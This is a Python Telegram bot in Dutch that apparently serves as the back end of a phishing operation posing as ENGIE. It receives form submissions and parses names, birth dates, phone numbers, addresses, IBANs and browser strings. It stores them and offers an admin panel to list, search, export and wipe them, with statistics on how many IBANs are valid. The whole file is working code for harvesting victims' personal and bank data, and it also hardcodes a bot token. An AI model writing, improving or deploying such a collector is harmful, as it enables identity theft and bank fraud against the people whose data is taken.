# bot.py
import json
import os
import logging
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

BOT_TOKEN = "8803616582:AAE4kHbY9A-IiRvC9pcu0frTbZL2nRDFnsE"
DATA_FILE = "submissions.json"
LOG_FILE = "bot.log"

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
    handlers=[
        logging.FileHandler(LOG_FILE, encoding="utf-8"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


def load_data():
    if not os.path.exists(DATA_FILE):
        return []
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError):
        return []


def save_data(data):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)


def parse_submission(text):
    lines = text.split("\n")
    entry = {
        "raw": text,
        "timestamp": datetime.now().isoformat(),
        "naam": None,
        "geboortedatum": None,
        "telefoon": None,
        "straat": None,
        "postcode": None,
        "iban": None,
        "iban_status": None,
        "browser": None
    }
    for line in lines:
        line = line.strip()
        if line.startswith("👤 Naam:"):
            entry["naam"] = line.replace("👤 Naam:", "").strip()
        elif line.startswith("🎂 Geboortedatum:"):
            entry["geboortedatum"] = line.replace("🎂 Geboortedatum:", "").strip()
        elif line.startswith("📱 Telefoon:"):
            entry["telefoon"] = line.replace("📱 Telefoon:", "").strip()
        elif line.startswith("🏠 Straat:"):
            entry["straat"] = line.replace("🏠 Straat:", "").strip()
        elif line.startswith("📮 Postcode:"):
            entry["postcode"] = line.replace("📮 Postcode:", "").strip()
        elif line.startswith("🏦 IBAN:"):
            entry["iban"] = line.replace("🏦 IBAN:", "").strip()
        elif "Geldig" in line and "IBAN" not in line:
            entry["iban_status"] = line.strip()
        elif line.startswith("🌐 Browser:"):
            entry["browser"] = line.replace("🌐 Browser:", "").strip()
    return entry


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📊 Aantal inzendingen", callback_data="count")],
        [InlineKeyboardButton("📋 Laatste 10 inzendingen", callback_data="last10")],
        [InlineKeyboardButton("🗑 Wis alle inzendingen", callback_data="wipe")],
        [InlineKeyboardButton("📥 Exporteer JSON", callback_data="export")],
        [InlineKeyboardButton("📈 Statistieken", callback_data="stats")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🤖 *ENGIE Bot — Beheerpaneel*\n\n"
        "Ik ontvang automatisch alle inzendingen van het formulier.\n"
        "Kies een optie hieronder:",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 *Beschikbare commando's:*\n\n"
        "/start — Open het beheerpaneel\n"
        "/count — Aantal inzendingen\n"
        "/last — Laatste 10 inzendingen\n"
        "/stats — Statistieken\n"
        "/export — Exporteer als JSON\n"
        "/find <zoekterm> — Zoek in inzendingen\n"
        "/wipe — Wis alle inzendingen\n"
        "/help — Deze help",
        parse_mode="Markdown"
    )


async def count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = load_data()
    await update.message.reply_text(f"📊 Totaal aantal inzendingen: *{len(data)}*", parse_mode="Markdown")


async def last(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = load_data()
    if not data:
        await update.message.reply_text("📭 Nog geen inzendingen.")
        return
    last_items = data[-10:][::-1]
    msg = "📋 *Laatste 10 inzendingen:*\n\n"
    for i, item in enumerate(last_items, 1):
        msg += (
            f"*{i}.* {item.get('naam', '?')} — `{item.get('timestamp', '')[:19]}`\n"
            f"   📱 {item.get('telefoon', '?')} | 🏦 `{item.get('iban', '?')}`\n"
            f"   {item.get('iban_status', '')}\n\n"
        )
    if len(msg) > 4000:
        msg = msg[:4000] + "\n...(afgekapt)"
    await update.message.reply_text(msg, parse_mode="Markdown")


async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = load_data()
    if not data:
        await update.message.reply_text("📭 Nog geen inzendingen.")
        return
    total = len(data)
    valid_iban = sum(1 for x in data if x.get("iban_status") and "Geldig" in x["iban_status"] and "Ongeldig" not in x["iban_status"])
    invalid_iban = total - valid_iban
    today = datetime.now().date().isoformat()
    today_count = sum(1 for x in data if x.get("timestamp", "").startswith(today))

    browsers = {}
    for x in data:
        b = x.get("browser", "onbekend")
        key = "Chrome" if "Chrome" in b else "Firefox" if "Firefox" in b else "Safari" if "Safari" in b else "Edge" if "Edg" in b else "Opera" if "OPR" in b else "Overig"
        browsers[key] = browsers.get(key, 0) + 1

    browser_str = "\n".join([f"   • {k}: {v}" for k, v in sorted(browsers.items(), key=lambda x: -x[1])])

    msg = (
        f"📈 *Statistieken*\n\n"
        f"📊 Totaal: *{total}*\n"
        f"📅 Vandaag: *{today_count}*\n"
        f"✅ Geldige IBAN: *{valid_iban}*\n"
        f"❌ Ongeldige IBAN: *{invalid_iban}*\n\n"
        f"🌐 *Browsers:*\n{browser_str}"
    )
    await update.message.reply_text(msg, parse_mode="Markdown")


async def export(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = load_data()
    if not data:
        await update.message.reply_text("📭 Nog geen inzendingen.")
        return
    filename = f"engie_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)
    with open(filename, "rb") as f:
        await update.message.reply_document(document=f, filename=filename)
    os.remove(filename)


async def find(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Gebruik: `/find <zoekterm>`", parse_mode="Markdown")
        return
    term = " ".join(context.args).lower()
    data = load_data()
    results = [x for x in data if term in json.dumps(x, ensure_ascii=False).lower()]
    if not results:
        await update.message.reply_text(f"🔍 Geen resultaten voor: *{term}*", parse_mode="Markdown")
        return
    msg = f"🔍 *{len(results)} resultaten voor* `{term}`:\n\n"
    for item in results[:10]:
        msg += (
            f"👤 {item.get('naam', '?')}\n"
            f"📱 {item.get('telefoon', '?')} | 🏦 `{item.get('iban', '?')}`\n"
            f"🕒 {item.get('timestamp', '')[:19]}\n\n"
        )
    if len(results) > 10:
        msg += f"...en nog {len(results) - 10} meer."
    await update.message.reply_text(msg, parse_mode="Markdown")


async def wipe(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("✅ Ja, wis alles", callback_data="wipe_confirm")],
        [InlineKeyboardButton("❌ Annuleer", callback_data="wipe_cancel")],
    ]
    await update.message.reply_text(
        "⚠️ *Weet je zeker dat je alle inzendingen wilt wissen?*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "count":
        items = load_data()
        await query.edit_message_text(f"📊 Totaal aantal inzendingen: *{len(items)}*", parse_mode="Markdown")
    elif data == "last10":
        items = load_data()
        if not items:
            await query.edit_message_text("📭 Nog geen inzendingen.")
            return
        last_items = items[-10:][::-1]
        msg = "📋 *Laatste 10 inzendingen:*\n\n"
        for i, item in enumerate(last_items, 1):
            msg += (
                f"*{i}.* {item.get('naam', '?')} — `{item.get('timestamp', '')[:19]}`\n"
                f"   📱 {item.get('telefoon', '?')} | 🏦 `{item.get('iban', '?')}`\n"
                f"   {item.get('iban_status', '')}\n\n"
            )
        if len(msg) > 4000:
            msg = msg[:4000] + "\n...(afgekapt)"
        await query.edit_message_text(msg, parse_mode="Markdown")
    elif data == "stats":
        items = load_data()
        if not items:
            await query.edit_message_text("📭 Nog geen inzendingen.")
            return
        total = len(items)
        valid_iban = sum(1 for x in items if x.get("iban_status") and "Geldig" in x["iban_status"] and "Ongeldig" not in x["iban_status"])
        invalid_iban = total - valid_iban
        today = datetime.now().date().isoformat()
        today_count = sum(1 for x in items if x.get("timestamp", "").startswith(today))
        msg = (
            f"📈 *Statistieken*\n\n"
            f"📊 Totaal: *{total}*\n"
            f"📅 Vandaag: *{today_count}*\n"
            f"✅ Geldige IBAN: *{valid_iban}*\n"
            f"❌ Ongeldige IBAN: *{invalid_iban}*"
        )
        await query.edit_message_text(msg, parse_mode="Markdown")
    elif data == "export":
        items = load_data()
        if not items:
            await query.edit_message_text("📭 Nog geen inzendingen.")
            return
        filename = f"engie_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(items, f, ensure_ascii=False, indent=2)
        with open(filename, "rb") as f:
            await query.message.reply_document(document=f, filename=filename)
        os.remove(filename)
        await query.edit_message_text("✅ Export verzonden!")
    elif data == "wipe":
        keyboard = [
            [InlineKeyboardButton("✅ Ja, wis alles", callback_data="wipe_confirm")],
            [InlineKeyboardButton("❌ Annuleer", callback_data="wipe_cancel")],
        ]
        await query.edit_message_text(
            "⚠️ *Weet je zeker dat je alle inzendingen wilt wissen?*",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
    elif data == "wipe_confirm":
        save_data([])
        await query.edit_message_text("🗑 Alle inzendingen zijn gewist.")
    elif data == "wipe_cancel":
        await query.edit_message_text("❌ Geannuleerd.")


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text or ""
    if "🔔 Nieuwe aanvraag" in text:
        entry = parse_submission(text)
        data = load_data()
        data.append(entry)
        save_data(data)
        logger.info(f"Nieuwe inzending opgeslagen: {entry.get('naam')} | IBAN: {entry.get('iban')}")

        keyboard = [
            [InlineKeyboardButton("📊 Aantal", callback_data="count")],
            [InlineKeyboardButton("📋 Laatste 10", callback_data="last10")],
            [InlineKeyboardButton("📈 Statistieken", callback_data="stats")],
        ]
        try:
            await update.message.reply_text(
                f"✅ *Inzending opgeslagen!*\n\n"
                f"👤 {entry.get('naam')}\n"
                f"📱 {entry.get('telefoon')}\n"
                f"🏦 `{entry.get('iban')}`\n"
                f"{entry.get('iban_status')}\n\n"
                f"📊 Totaal: *{len(data)}*",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"Kon geen bevestiging sturen: {e}")


def main():
    logger.info("Bot gestart...")
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("count", count))
    app.add_handler(CommandHandler("last", last))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("export", export))
    app.add_handler(CommandHandler("find", find))
    app.add_handler(CommandHandler("wipe", wipe))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
